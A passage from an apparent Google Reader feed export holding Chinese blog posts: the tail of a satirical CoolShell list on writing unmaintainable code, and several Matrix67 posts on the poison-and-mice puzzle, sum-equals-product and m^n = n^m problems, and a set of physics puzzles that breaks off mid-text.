drawRectangle(width, height)，等release了几个版本后，再把其改回去。这样维护程序的程序员们将不能很快地明白哪一个是对的。</li>\n<li><strong>把变量改在名字上</strong>。例如，把setAlignment(int alignment)改成，setLeftAlignment, setRightAlignment, setCenterAlignment。</li>\n<li><strong>Packratting</strong>。保留你所有的没有使用的和陈旧的变量，方法和代码。</li>\n<li><strong>That’s Fina</strong>l。Final你所有的子结点的类，这样，当你做完这个项目后，没有人可以通过继承来扩展你的类。java.lang.String不也是这样吗？</li>\n<li><strong>避免使用接口</strong>。在java中，BS接口，在C++中BS使用虚函数。</li>\n<li><strong>避免使用layout</strong>。这样就使得我们只能使用绝对坐标。如果你的老大强制你使用layout，你可以考虑使用GridBagLayout，然后把grid坐标hard code.</li>\n<li><strong>环境变量</strong>。如果你的代码需要使用环境变量。(getenv() – C++ / System.getProperty() – Java )，那么，你应该把你的类的成员的初始化使用环境变量，而不是构造函数。</li>\n<li><strong>使用Magic numbe</strong>r。参看《<a title=\"Linux 2.6.39-rc3的一个插曲\" href=\"http://coolshell.cn/articles/4576.html\">Linux一个插曲</a>》。</li>\n<li><strong>使用全局变量</strong>。1）把全局变量的初始化放在不同的函数中，就算这个函数和这个变量没有任何关系，这样能够让我们的维护人员就像做侦探工作一样。2）使用全局变量可以让你的函数的参数变得少一些。</li>\n<li><strong>配置文件</strong>。配置文件主要用于一些参数的初始化。在编程中，我们可以让配置文件中的参数名和实际程序中的名字不一样。</li>\n<li><strong>膨胀你的类</strong>。让你的类尽可能地拥有各种臃肿和晦涩的方法。比如，你的类只实现一种可能性，但是你要提供所有可能性的方法。不要定义其它的类，把所有的功能都放在一个类中。</li>\n<li><strong>使用子类</strong>。面向对象是写出无法维护代码的天赐之物。如果你有一个类有十个成为（变量和方法）你可以考虑写10个层次的继承，然后把这十个属性分别放在这十个层次中。如果可能的话，把这十个类分别放在十个不同的文件中。</li>\n</ul>\n<h4>混乱你的代码</h4>\n<ul>\n<li><strong>使用XML</strong>。XML的强大是无人能及的。使用XML你可以把本来只要10行的代码变成100行。而且，还要逼着别人也有XML。（参看，<a title=\"信XML，得永生！\" href=\"http://coolshell.cn/articles/2504.html\">信XML得永生</a>，<a title=\"信XML，得自信\" href=\"http://coolshell.cn/articles/3498.html\">信XML得自信</a>）</li>\n<li><strong>混乱C代码</strong>。在《<a title=\"如何加密/混乱C源代码\" href=\"http://coolshell.cn/articles/933.html\">如何加密源代码</a>》中已经说过一些方法了，这里再补充一些。</li>\n<li><strong>使用不同的进制</strong>。比如：10 和010不是一样的。再比如：array = new int[]{   111,   120,   013,   121,};</li>\n<li><strong>尽量使用void*</strong>。然后把其转成各种类型</li>\n<li><strong>使用隐式的转型</strong>。C++的构造函数可以让你神不知鬼不觉得完成转型。</li>\n<li><strong>分解条件表达式</strong>。如：把 a==100分解成，a&gt;99 &amp;&amp; a&lt;101</li>\n<li><strong>学会利用分号</strong>。如：if ( a );else;{   int d;   d = c;}</li>\n<li><strong>间接转型</strong>。如：把double转string，写成new Double(d).toString() 而不是 Double.toString(d)</li>\n<li><strong>大量使用嵌套</strong>。一个NB的程序员可以在一行代码上使用超过10层的小括号（），或是在一个函数里使用超过20层的语句嵌套{}，把嵌套的if else 转成 [? :] 也是一件很NB的事。</li>\n<li><strong>使用C的变种数组</strong>。myArray[i] 可以变成*(myArray + i) 也可以变成 *(i + myArray) 其等价于 i[myArray]。再看一个函数调用的示例，函数声明：int myfunc(int q, int p) { return p%q; } 函数调用myfunc(6291, 8)[Array];</li>\n<li><strong>长代码行</strong>。一行的代码越长越好。这样别人阅读时就需要来来回回的</li>\n<li><strong>不要较早的return</strong>。不要使用goto，不要使用break，这样，你就需要至少5层以上的if-else来处理错误。</li>\n<li><strong>不要使用{}</strong>。不要在if else使用{}，尤其是在你重量地使用if-else嵌套时，你甚至可以在其中乱缩进代码，这样一来，就算是最有经验的程序员也会踩上陷阱。</li>\n<li><strong>使用宏定义</strong>。宏定义绝对是混乱C/C++代码的最佳利器。参看 <a title=\"老手是这样教新手编程的\" href=\"http://coolshell.cn/articles/2420.html\">老手是这样教新手编程的</a>。</li>\n<li><strong>琐碎的封装</strong>。比较封装一个bool类，类里面什么都做，就是一个bool.</li>\n<li><strong>循环</strong>。千万不可用for(int i=0; i&lt;n; i++)使用while代替for，交换n和i，把&lt;改成&lt;=，使用 i–调整步伐 。</li>\n</ul>\n<h4>测试</h4>\n<ul>\n<li><strong>从不测试</strong>。千万不要测试任何的出错处理，从来也不检测系统调用的返回值。</li>\n<li><strong>永远不做性能测试</strong>。如果不够快就告诉用户换一个更快的机器。如果你一做测试，那么就可能会要改你的算法，甚至重设计，重新架构。</li>\n<li><strong>不要写测试案例</strong>。不要做什么代码覆盖率测试，自动化测试。</li>\n<li><strong>测试是懦夫行为</strong>。一个勇敢的程序员是根本不需要这一步的。太多的程序太害怕他们的老板，害怕失去工作，害怕用户抱怨，甚至被起诉。这种担心害怕直接影响了生产力。如果你对你的代码有强大的信心，那还要什么测试呢？真正的程序员是不需要测试自己的代码的。</li>\n</ul>\n<h4>其它</h4>\n<ul>\n<li><strong>你的老板什么都知道</strong>。无论你的老板有多SB，你都要严格地遵照他的旨意办事，这样一来，你会学到更多的知识如何写出无法维护的代码来的。</li>\n<li><strong>颠覆Help Desk</strong>。你要确保你那满是bug的程序永远不要被维护团队知道。当用户打电话和写邮件给你的时候，你就不要理会，就算要理会，让用户重做系统或是告诉用户其帐号有问题，是标准的回答。</li>\n<li><strong>闭嘴</strong>。对于一些像y2k这样的大bug，你要学会守口如瓶，不要告诉任何人，包括你的亲人好友以及公司的同事和管理层，这样当到那一天的时候，你就可以用这个bug挣钱了。</li>\n<li><strong>忽悠</strong>。你会学会忽悠，就算你的代码写得很烂，你也要为其挂上GoF设计模式的标签，就算你的项目做得再烂，你也要为其挂上敏捷的标签，只有学会<a title=\"再谈敏捷和ThoughtWorks中国咨询师\" href=\"http://coolshell.cn/articles/3745.html\">像中国Thoughtworks的咨询师那样去忽悠</a>，你才能学会更炫更酷的方法，让整个团队和公司，甚至整个业界都开始躁动，这样才能真正为难维护的代码铺平道路。</li>\n</ul>\n<p>这个文档中还有很多很多，实在是太TMD强大了，大家自己去看看吧。有精力有能力的朋友不妨把其翻译成中文。</p>\n<p>总之，我们的口号是——</p>\n<h4 style=\"text-align:center\">Write Everywhere, Read Nowhere</h4>\n<p>（全文完）</p>\n<h3>相关文章</h3><ul><li>2011年06月29日 -- <a href=\"http://coolshell.cn/articles/4905.html\" title=\"语言的数据亲和力\">语言的数据亲和力</a></li><li>2011年04月06日 -- <a href=\"http://coolshell.cn/articles/4220.html\" title=\"一些有意思的文章和资源\">一些有意思的文章和资源</a></li><li>2011年03月29日 -- <a href=\"http://coolshell.cn/articles/4102.html\" title=\"如何学好C语言\">如何学好C语言</a></li><li>2010年12月21日 -- <a href=\"http://coolshell.cn/articles/3421.html\" title=\"流体力学的演示\">流体力学的演示</a></li><li>2010年11月02日 -- <a href=\"http://coolshell.cn/articles/3258.html\" title=\"C++的字符串格式化库\">C++的字符串格式化库</a></li><li>2010年01月21日 -- <a href=\"http://coolshell.cn/articles/2053.html\" title=\"最为奇怪的程序语言的特性\">最为奇怪的程序语言的特性</a></li><li>2009年12月24日 -- <a href=\"http://coolshell.cn/articles/1992.html\" title=\"程序员眼中的编程语言\">程序员眼中的编程语言</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1307172440617",
    "timestampUsec" : "1307172440617836",
    "id" : "tag:google.com,2005:reader/item/f5a26f0646dcd59e",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "进制", "趣题", "算法", "Brain Storm", "二进制" ],
    "title" : "趣题：老鼠与毒药问题的推广",
    "published" : 1306470477,
    "updated" : 1306470477,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4361",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    今天的趣题来源于 <a href=\"javascript:void(0);\">IBM Ponder This 三月份的谜题</a>。</p>\n<p>    大家应该都听说过这个老题目：有 1000 个一模一样的瓶子，其中有 999 瓶是普通的水，有一瓶是毒药。任何喝下毒药的生物都会在一星期之后死亡。现在，你只有 10 只小白鼠和一星期的时间，如何检验出哪个瓶子里有毒药？</p>\n<p>    这个问题的答案也堪称经典：把瓶子从 0 到 999 依次编号，然后全部转换为 10 位二进制数。让第一只老鼠喝掉所有二进制数右起第一位是 1 的瓶子，让第二只老鼠喝掉所有二进制数右起第二位是 1 的瓶子，等等。一星期后，如果第一只老鼠死了，就知道毒药瓶子的二进制编号中，右起第一位是 1 ；如果第二只老鼠没死，就知道毒药瓶子的二进制编号中，右起第二位是 0 ⋯⋯每只老鼠的死活都能确定出 10 位二进制数的其中一位，由此便可知道毒药瓶子的编号了。</p>\n<p>    现在，有意思的问题来了：如果你有两个星期的时间（换句话说你可以做两轮实验），为了从 1000 个瓶子中找出毒药，你最少需要几只老鼠？注意，在第一轮实验中死掉的老鼠，就无法继续参与第二次实验了。</p>\n<p><span></span></p>\n<p> <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n    答案：7 只老鼠就足够了。事实上，7 只老鼠足以从 3<sup>7</sup> = 2187 个瓶子中找出毒药来。首先，把所有瓶子从 0 到 2186 编号，然后全部转换为 7 位三进制数。现在，让第一只老鼠喝掉所有三进制数右起第一位是 2 的瓶子，让第二只老鼠喝掉所有三进制数右起第二位是 2 的瓶子，等等。一星期之后，如果第一只老鼠死了，就知道毒药瓶子的三进制编号中，右起第一位是 2 ；如果第二只老鼠没死，就知道毒药瓶子的三进制编号中，右起第二位不是 2，只可能是 0 或者 1 ⋯⋯也就是说，每只死掉的老鼠都用自己的生命确定出了，三进制编号中自己负责的那一位是 2 ；但每只活着的老鼠都只能确定，它所负责的那一位不是 2 。于是，问题就归约到了只剩一个星期时的情况。在第二轮实验里，让每只活着的老鼠继续自己未完成的任务，喝掉它负责的那一位是 1 的所有瓶子。再过一星期，毒药瓶子的三进制编号便能全部揭晓了。</p>\n<p>    类似地，我们可以证明， n 只小白鼠 t 周的时间可以从 (t+1)<sup>n</sup> 个瓶子中检验出毒药来。</p><img src=\"http://www1.feedsky.com/t1/523828861/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4361\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1307172386687",
    "timestampUsec" : "1307172386687340",
    "id" : "tag:google.com,2005:reader/item/75fed85743d63aff",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "趣题", "Brain Storm", "算式", "证明" ],
    "title" : "或许你从小就一直在思考的两个算术问题",
    "published" : 1306768418,
    "updated" : 1306768418,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4365",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    你是否很小就注意到了下面这两个有趣的算术现象？这两个简单的算术谜题是否一直都困扰着你？今天，大家终于有机会解开谜团了。</p>\n<p>    <strong>问题一： 2 加 2 等于 4 ， 2 乘 2 也等于 4 。还有其它的整数对，它们的和与积也相等吗？</strong></p>\n<p>    我们要求的就是 mn = m+n 的整数解。方程可以变为</p>\n<p>      mn - m - n + 1 = 1</p>\n<p>    也就是</p>\n<p>      (m - 1)(n - 1) = 1</p>\n<p>    由于 m 、 n 都是整数，因此 m - 1 和 n - 1 也都是整数。两个整数之积为 1 ，只有两种情况——这两个数都是 1，或者这两个数都是 -1 。前者对应了 m = 2, n = 2 ，后者解出来则是 m = 0, n = 0 。如果把 (0, 0) 看作平凡解（或者如果我们把问题限制在正整数范围）的话，非平凡解就只有 (2, 2)，没有其它的了。</p>\n<p><span></span><br>\n    有趣的是，如果三个正整数之和恰好等于它们的乘积，解也只有一个：(1, 2, 3) 。更有趣的是，如果四个正整数之和恰好等于它们的乘积，解仍然是唯一的：(1, 1, 2, 4) 。如果五个数呢？这一回，解就不止一个了，(1, 1, 2, 2, 2) 、 (1, 1, 1, 3, 3) 、 (1, 1, 1, 2, 5) 都是满足要求的解。<br>\n    我们自然想问，对于哪些 n，“n 个正整数的和恰好等于它们的积”有唯一解。让人意想不到的是，这竟然是一个数学未解之谜。目前已经知道，在 n &lt; 13 587 782 064 的范围内，只有 n = 2, 3, 4, 6, 24, 114, 174, 444 时有唯一解。是否有其它满足要求的 n ，这个问题至今仍未解决。</p>\n<p> <br>\n <br>\n    <strong>问题二： 2 的 4 次方等于 16 ， 4 的 2 次方也等于 16 。还有其它的正整数 m 和 n ，使得 m 的 n 次方和 n 的 m 次方也相等吗？</strong></p>\n<p>    当然，我们忽略所有 m = n 的平凡解。另外，当 m = 1 时，有 1<sup>n</sup> = n<sup>1</sup> ，于是 m = n = 1 。因此，下面我们都假设 2 ≤ m &lt; n 。</p>\n<p>    等式两边同时除以 m<sup>m</sup>，有</p>\n<p>      m<sup>n</sup>/m<sup>m</sup> = n<sup>m</sup>/m<sup>m</sup></p>\n<p>    即</p>\n<p>      m<sup>n - m</sup> = (n/m)<sup>m</sup></p>\n<p>    由于等式左边是一个整数，因此等式右边也一定是一个整数，可见 n 一定是 m 的整数倍。不妨令 n = k·m ，其中 k 是一个大于等于 2 的整数。于是上式继续变为：</p>\n<p>      m<sup>km - m</sup> = k<sup>m</sup></p>\n<p>    即</p>\n<p>      m<sup>m(k - 1)</sup> = k<sup>m</sup></p>\n<p>    两边同时开 m 次方，有</p>\n<p>      m<sup>k - 1</sup> = k</p>\n<p>    当 k = 2 时，上式化为 m<sup>1</sup> = 2，于是我们找到一组非平凡解 m = 2, n = 4 。<br>\n    如果 k = 3 呢？上式将变为 m<sup>2</sup> = 3。注意到我们的 m 至少等于 2 ，因此 m<sup>2</sup> 至少也是 4 ，是不可能等于 3 的。<br>\n    如果 k 更大呢？m<sup>k - 1</sup> 肯定会更大，更不可能等于 k 了。我们用数学归纳法证明这一点。<br>\n    假设 m<sup>k - 2</sup> &gt; k - 1，那么m<sup>k - 1</sup> = m · m<sup>k - 2</sup> &gt; m(k - 1) ；但 m 是大于等于 2 的，因而 m(k - 1) ≥ 2(k - 1) ；但 k 是大于等于 3 的，因此 2(k - 1) = 2k - 2 &gt; k。<br>\n    因此， (2, 4) 是这个算术问题的唯一一组非平凡解。</p><img src=\"http://www1.feedsky.com/t1/526871266/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4365\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1307172356365",
    "timestampUsec" : "1307172356365451",
    "id" : "tag:google.com,2005:reader/item/56cd18f3e962cbd5",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "趣题", "Brain Storm", "物理" ],
    "title" : "44个精彩的物理趣题",
    "published" : 1307027887,
    "updated" : 1307027887,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4372",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    这个 Blog 几乎一直在讲数学趣题，却很少提到物理趣题。其实，我个人觉得，物理也是相当好玩的（我是化学不好才选的文科）。隐约记得初中搞物理竞赛时，曾见过大量让人大呼过瘾的好题。前几天看到了<a href=\"http://star.tau.ac.il/QUIZ/\">一个绝好的网站</a>，里面有相当多的物理题目，让我激动了好一阵子。我搜集整理了里面的一些好题，加上了我自己的一些补充，在这里和大家分享。不过，由于我的物理实在不怎么样，如果出现什么错误，请大家及时纠正。</p>\n<p>    那个网站上的“官方解答”并不见得靠谱，也不知是因为我没有悟到，还是因为它真的不靠谱。不管怎样，我给出的基本上还是它的官方答案。其实，阅读过程中你会发现，答案是次要的，真正有趣的其实是问题本身。</p>\n<p>    几乎从没写过物理题目的 Blog ，想要用一篇文章总结物理趣题，因此毫无疑问——这是一篇非常，非常，非常长的文章。建议大家用自己喜欢的方式做个书签，一天看一点。如果觉得还不过瘾，推荐订阅物理大牛 <a href=\"http://www.eaglefantasy.com/\">EagleFantasy 的 Blog</a>。</p>\n<p>    另外，此日志一出，想必又会收到无数邮件，询问我作图用的什么工具的。在此就先回答了——请见 <a href=\"http://www.matrix67.com/blog/faq\">FAQ</a> 。</p>\n<p>    开始吧。</p>\n<p><span></span></p>\n<p> <br>\n    <strong>有一块 V 字形木板，两侧与地面的夹角都是 θ 。一根密度均匀的绳子放在木板上，绳子与木板之间的摩擦系数为 1 。整个系统左右对称。没挨着木板的那段绳子所占的比例最大是多少？此时 θ 是多少度？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060201.png\" alt=\"\"></p>\n<p>    用一些非常初等的方法可以得到，答案是 (√<span style=\"text-decoration:overline\">2</span> - 1)<sup>2</sup> ≈ 0.172 ，此时 θ = 22.5° 。具体解答可以见 <a href=\"http://star.tau.ac.il/QUIZ/05/sol_rope.pdf\">http://star.tau.ac.il/QUIZ/05/sol_rope.pdf</a> 。</p>\n<p> <br>\n <br>\n    <strong>一个长、宽、高分别为 a 、 b 、 c 的长方体物块，斜靠在一个墙角。由于墙壁和地面都是完全光滑的，因此物块将会开始下滑。什么时候，物块会脱离墙壁？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060202.png\" alt=\"\"></p>\n<p>    为了解决这个问题，首先需要把物块和地面的夹角记作 θ ，物块下滑过程中的各种物理量都可以用 θ 来表示。然后，解决这个问题的关键就在于，当物块脱离墙壁时，物块向右的加速度就消失了，这个临界点就由等量关系 dv<sub>x</sub> / dθ = 0 给出。不过，由此产生的方程非常复杂，我们只能用数值的方式去解它。</p>\n<p> <br>\n <br>\n    <strong>有一个半圆柱体横放在水平桌面上，截面的半径为 R 。我们在半圆柱体上放一块木板，试图让它在半圆上保持平衡。假如这块木板非常薄，那么这块木板很容易放稳，即使有些小动静，木板也会自动恢复平衡。但考虑另外一个极端，假如这是一块非常厚非常厚的木板（甚至是大楼一般的形状），它显然不能稳放在这个半圆上。那么，这中间一定会有一个临界点。这个临界点在哪里？换句话说，这个半圆上最多能放稳一块多厚的木板？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060203.png\" alt=\"\"></p>\n<p>    把半圆的半径记作 R ，把木板的厚度记作 t 。如果把木板平放在半圆上，其重心的高度就是 R + t/2 。假如这块木板倾斜了一个微小的角度 θ ，那么图中 M&#39;T 的长度等于弧 MT 的长度，即 2πR·(θ/2π) = R·θ 。此时，木板的重心 G&#39; 的高度变为了 (t/2)cosθ + (R·θ)sinθ + R·cosθ。为了让木板保持平衡，不会自动往下滑，我们需要让新的重心高度大于原来的重心高度，即 (t/2)cosθ + (R·θ)sinθ + R·cosθ &gt; R + t/2。解出不等式，再令 θ→0 ，即可得到 t &lt; 2R。也就是说，一旦木板的厚度超过半圆的直径，木板就无法放稳了。</p>\n<p> <br>\n <br>\n    <strong>假如你面向东边，站在冰面上，鞋底与冰面完全没有摩擦。你能否做出一系列动作，使得自己最后能面向西边站立？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060204.jpg\" alt=\"\"></p>\n<p>    可以。只需要重复“伸臂－挥臂－屈臂”的动作，你的身体便会向反方向转动一点。期待实验党。</p>\n<p> <br>\n <br>\n    <strong>用过多年的插座（尤其是插过大功率电器的插座），右边的孔（火线）往往会有过热的迹象。如果是劣质插座，加上经常插拔插头的话，右边的孔甚至会有烧黑了的痕迹。明明是通过相同大小的电流，为什么右边的孔会被烧得更厉害呢？</strong></p>\n<p>    目前，这个问题没有一个所谓的标准答案。当然，这个现象本身是否存在也是存疑的。大家不妨来说说自己家里插座的情况。</p>\n<p> <br>\n <br>\n    <strong>呼拉圈是怎么转起来的？人应该做一个什么样的运动？呼拉圈的转动频率是由什么决定的？和人的体形、运动速度、运动方式有关系吗？是否存在一个最优的频率？⋯⋯</strong></p>\n<p>    我有几件事情死活搞不明白，吹泡泡是怎么吹出来的，小舌颤音是怎么发出来的，骑车不动把手是怎么实现拐弯的⋯⋯当然，还有呼拉圈是怎么转起来的。和呼拉圈有关的问题似乎永远也列举不完。如果你真的把它当成一回事仔细分析，你会发现这不是一般的困难。<br>\n    2004 年， Biological Cybernetics 上发表了一篇长达 15 页的论文，论文题目是 Coordination Modes in the Multi-Segmental Dynamics of Hula-Hooping 。这篇论文终于不负众望，成功地摘得了诺贝尔奖——当然，是搞笑版的。</p>\n<p> <br>\n <br>\n    <strong>投一枚硬币，如果是正面，我就去打球，如果是反面，我就去打游戏，如果立起来，我就去学习。不知道大家第一次看到这个笑话时，有没有想过，如果一枚硬币真的有 1/3 的概率正面朝上，有 1/3 的概率反面朝上，有 1/3 的概率立起来，那么这个硬币的半径与厚度满足什么样的关系？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060205.png\" alt=\"\"></p>\n<p>    这枚硬币必须满足，把它立起来后，即使倾斜 30 度仍然不倒。这样，硬币直立的“势力范围”才会达到 120 度。因此，硬币的直径应该是厚度的 √<span style=\"text-decoration:overline\">3</span> 倍。</p>\n<p> <br>\n <br>\n    <strong>考虑某颗星球，它由某种密度均匀的物质组成，其质量为 M ，体积为 V 。如果这颗星球是一个球体，那么它的半径 R = ((3V) / (4π))<sup>1/3</sup>，星球表面上的重力加速度则为 g = GM / R<sup>2</sup> = GM((4π) / (3V))<sup>2/3</sup>，其中 G 是万有引力常数。</strong><br>\n    <strong>考虑这颗星球所有可能的形状，怎样的形状才会让星球表面的某一点重力加速度达到最大？最大值是多少？</strong></p>\n<p>    下图就是让表面某处的重力加速度达到最大的星球形状。这个图形是一个稍微有些变形的球体，整个图形是一个以 z 方向为轴的旋转体，顶端的 m 点即是重力加速度最大的点，它的重力加速度为 g = (4/5)(15/4)<sup>1/3</sup>π<sup>2/3</sup>M / V<sup>2/3</sup>，只比球形星体的重力加速度大 2.6% 。这是又一个经典的例子——圆形似乎并不是那么完美。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060206.png\" alt=\"\"></p>\n<p>    这个问题的解法非常漂亮。首先，假设我们想要让星体表面上的某个点 m 的重力加速度最大，并且所受重力方向在 z 轴上，那么这个星体必然是沿 z 轴方向对称的。否则，取出不对称的一层，把多的部分填进少的部分让它变成一个完全对称的圆盘，这将会让 m 点在竖直方向上的受力变大。不断这样做直到这个图形沿 z 轴完全对称，显然就得到了一个更优的形状。<br>\n    接下来的步骤就真的神了。现在，在星体上取一个非常细的圆环，假设它的质量是 dM 。那么，这个圆环所贡献的重力加速度大小就是 G·dM·cosθ /r<sup>2</sup> 。如果把这个圆环从星体中挖掉，放到其它的位置上，那么新的圆环将会有新的 r 值和 θ 值。当整个形状达到最优时，这个形状将位于“极值点”的位置，也就是说它的“微分”为 0 ，任何微小的变动都不会改变 m 的加速度。这就意味着， cosθ / r<sup>2</sup> 是一个常数。这个条件就确定出整个星体的形状。</p>\n<p> <br>\n <br>\n    <strong>Fermat 光程最短原理指出，光从 A 点到 B 点，总是沿着最快的路径传播。这一神奇的定律一下子就把直线传播定律、反射定律、折射定律统一在了一起。不过，后来我们知道了，更一般的描述应该是，光总是沿着光程处于驻点的路径传播。为什么会加上这一条？有没有光程极大的例子呢？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060207.png\" alt=\"\"></p>\n<p>    这里有一个例子。考虑椭圆内的两个焦点 A 、 B ，和椭圆上的一点 M 。显然，不管 M 取在哪儿， AM + BM 都是相同的。现在，在椭圆内部画一条曲线，这条曲线与椭圆相切于 M 点。然后，擦掉原来的椭圆，把这条曲线视作镜面。显然， AMB 仍然是一条反射光线，但从其它地方反射，光程都会小于 AMB 。 AMB 是一个光程极大的路径。</p>\n<p> <br>\n <br>\n    <strong>物理量的单位总是由基本单位（质量、长度、时间等）的幂相乘得来的。比如，能量的单位就是 1J = kg·m<sup>2</sup>·s<sup>-2</sup> 。为什么没有什么物理量，它是由基本单位通过更复杂的形式导出的？比如说，为何没有什么物理量，它的单位是 sin(kg)·log(m) ？</strong></p>\n<p>    这是一个非常有趣，无疑也是非常深刻的问题。它让我们开始认真思考一个看上去很不像问题的问题：什么是物理量？什么是物理单位？我们需要去挖掘物理量和物理单位的最基本、最本质的性质。<br>\n    网站上的标准答案是，只有这种形式的导出单位才能保证，在不同的单位制下，得到的导出单位是等价的。<br>\n    具体地说，物理单位的作用就是用来描述，当各个基本单位的尺度变化以后，这个物理量会发生怎样的变化。比如说，密度单位是质量除以长度的三次方，就表明如果质量扩大到原来的 2 倍（或者说单位量变成了原来的 1/2 ），长度扩大到原来的 4 倍（或者说单位量变成了原来的 1/4 ），那么这个物理量将会变成原来的 2/4<sup>3</sup> = 1/32 。<br>\n    现在，假设某个物理量的单位是质量的正弦乘以长度的对数。按照国际标准单位制，这个单位是 sin(kg)·log(m) 。假如单位换成了 sin(g)·log(cm) ，那么这个物理量将会变成原来的 sin(1000)·log(100) ≈ 3.80792 。再继续换算成 sin(mg)·log(mm) ，物理量应该继续变成原来的 sin(1000)·log(10) ≈ 1.90396 。但是，如果从 sin(kg)·log(m) 直接变到 sin(mg)·log(mm) ，物理量应该变成原来的 sin(1 000 000)·log(1000) ≈ -2.41767 ，这就和前面的结果矛盾了。利用一些微积分知识可以证明，如果一个合成物理单位不会出现这样的问题，它必然是基本单位的幂的乘积的形式。<br>\n    不过，这个解释并不能让我十分满意。大家怎么看呢？</p>\n<p> <br>\n <br>\n    <strong>有一个无穷大的正方形网格，每条小线段都是 1Ω 的电阻丝。求相邻两点间的等效电阻阻值。</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060208.png\" alt=\"\"></p>\n<p>    这个问题有一个很妙的解法。假设一个大小为 1A 的电流从红点处流入，从各个无穷远处流出。由对称性，有 (1/4)A 的电流将会流过红蓝两点之间的线段。现在，再假设一个大小为 1A 的电流从各个无穷远处流入，从蓝色点流出。由对称性，红蓝两点之间的线段仍然有 (1/4)A 的电流。现在，把两种情况叠加在一起看，大小为 1A 的电流从红点进去从蓝点出来，那么，红蓝两点间的线段就有 (1/2)A 的电流。因而，两点间的电压就是 (1/2)A·1Ω = (1/2)V 。因而两点间的等效电阻就是 (1/2)V / 1A = (1/2)Ω。</p>\n<p>    说到无穷网格电阻的问题，我们有说不完的话题。这个问题本身的扩展非常之多。例如，我们可以把问题扩展到 N 维的情形：N 维无限电阻网格中，相邻两点的等效电阻是多少？利用同样的方法可以得出，答案就是 1/N。</p>\n<p>    回到二维情形，如果我们换一个扩展方向，改问对角两点间的电阻，上述分析方法就不行了。而这个加强版问题的答案也更加玄妙：两点间的阻值为 (π/2)Ω 。大家可以在网上很多地方查到这个加强版问题的解法。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060209.png\" alt=\"\"></p>\n<p>    <a href=\"http://xkcd.com/356/\">xkcd</a> 有一个经典漫画，形象地描绘出 nerd 们被数理趣题折磨的感受。当然，这幅画本身也折磨了不少人，网上涌现出大量对这个问题的讨论。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060210.png\" alt=\"\"></p>\n<p>    还有一种经典的无穷电阻问题：一个向右无穷延伸的梯子形网格，每条线段都是 1Ω 的电阻，求两点间的等效电阻。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060211.png\" alt=\"\"></p>\n<p>    问题的解法非常漂亮。假设我们要求的答案是 R，则 R 可以看作是三个 1Ω 的电阻串联，然后把一个阻值为 R 的电阻（也就是它本身）与中间那个  1Ω 电阻并联所得。于是得到等量关系 R = 1 + 1/(1+1/R) + 1，解得 R = 1 + √<span style=\"text-decoration:overline\">3</span>。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060212.png\" alt=\"\"></p>\n<p>    还有一些经典的求电阻问题。其中一个问题是，一个正方体的 12 条棱上各有一个 1Ω 的电阻，求距离最远的两个顶点之间的等效电阻。 2007 年 10 月份 <a href=\"http://domino.research.ibm.com/comm/wwwr_ponder.nsf/challenges/October2007.html\">IBM Ponder This</a> 的题目则是，分别考虑五种正多面体，如果每条棱上各有一个 1Ω 的电阻，则相邻两顶点的等效电阻是多少？巧妙地利用对称性，这几个问题都可以迅速被秒杀。</p>\n<p> <br>\n <br>\n    <strong>假设有一个圆锥形的冰山，冰山表面绝对光滑。你打算把一个绳圈套在山尖上，然后沿着绳索爬上去。考虑两个极端情况：如果冰山特别尖，顶角特别小，这个计划自然不成问题；但若冰山特别“肥”，顶角特别大，向下拉绳子后，绳圈将会滑出山尖。这中间一定有一个临界点，也就是绳圈掉不出来的最大顶角。这个顶角是多大？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060213.png\" alt=\"\"></p>\n<p>    这是一个非常有趣的问题。问题的本质就是，绳圈在怎样的圆锥面上才存在“被拉紧”的稳定状态。容易想到，绳子被拉紧，意味着绳圈从 A 